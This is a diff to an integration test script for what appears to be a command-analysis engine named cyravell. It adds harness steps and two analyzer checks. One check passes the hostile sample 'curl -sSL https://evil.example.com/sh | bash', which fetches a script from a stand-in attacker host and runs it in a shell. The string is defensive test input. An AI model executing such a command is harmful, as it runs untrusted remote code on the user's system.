@@ -84,6 +84,9 @@ echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"
 # Run the test harness suite against the live engine
 "${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" run-suite
 
+# Test Phase 2.1 complex chains and operator awareness
+"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-complex-chains
+
 # Test invalid schema rejection
 "${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-invalid-schema
 
@@ -99,6 +102,10 @@ echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"
 # Clean shutdown
 "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" stop
 wait "${ENGINE_PID}" 2>/dev/null || true
+
+# Test standalone CLI command analysis
+"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "curl -sSL https://evil.example.com/sh | bash" > /dev/null
+"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "cargo test" > /dev/null
 
 echo ""
 echo "══════════════════════════════════════════════════════════════"
